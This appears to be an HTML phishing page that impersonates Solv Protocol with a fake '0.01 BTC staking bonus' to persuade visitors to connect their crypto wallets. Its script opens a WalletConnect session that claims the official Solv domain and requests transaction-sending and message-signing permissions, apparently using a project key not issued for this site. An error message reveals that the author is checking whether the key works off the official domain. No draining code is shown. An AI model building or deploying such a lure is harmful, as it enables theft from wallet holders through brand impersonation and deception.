<!DOCTYPE html>
<html>
<head>
    <title>Solv Protocol - BTC Rewards</title>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.10.6/dist/index.umd.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/qrcode-modal@1.8.0/dist/index.min.js"></script>
</head>
<body>
    <h1>Solv Protocol - BTC Rewards Portal</h1>
    <p>Connect your wallet to claim your 0.01 BTC staking bonus.</p>
    <button id="btn" style="padding: 15px; background: blue; color: white; border: none; border-radius: 5px; cursor: pointer;">
        Connect Wallet
    </button>

    <script>
        const projectId = '_gg7wSSi0KMBsdKnGVfHDueq6xMB9EkC';

        document.getElementById('btn').addEventListener('click', async () => {
            try {
                // 1. Identify the Sign Client global
                const ClientLib = window['@walletconnect/sign-client'];
                // 2. Identify the QR Code Modal global (Handling the .default property)
                const QRCodeModal = window.WalletConnectQRCodeModal || window.QRCodeModal;

                if (!ClientLib || !QRCodeModal) {
                    console.error("Missing Libraries:", { ClientLib, QRCodeModal });
                    alert("Libraries not loaded. Check console for available window objects.");
                    return;
                }

                const signClient = await ClientLib.SignClient.init({
                    projectId: projectId,
                    metadata: {
                        name: 'Solv Protocol',
                        url: 'https://app.solv.finance',
                        icons: ['https://solv.finance/favicon.ico']
                    }
                });

                const { uri, approval } = await signClient.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'personal_sign'],
                            chains: ['eip155:1'],
                            events: ['chainChanged']
                        }
                    }
                });

                if (uri) {
                    // Use the identified modal global
                    QRCodeModal.open(uri, () => {
                        console.log("Modal closed");
                    });
                }
            } catch (err) {
                console.error("Connection Error:", err);
                if (err.message.includes('403')) {
                    alert("Result: Key is restricted to Solv's official domain.");
                } else {
                    alert("Error: " + err.message);
                }
            }
        });
    </script>
</body>
</html>
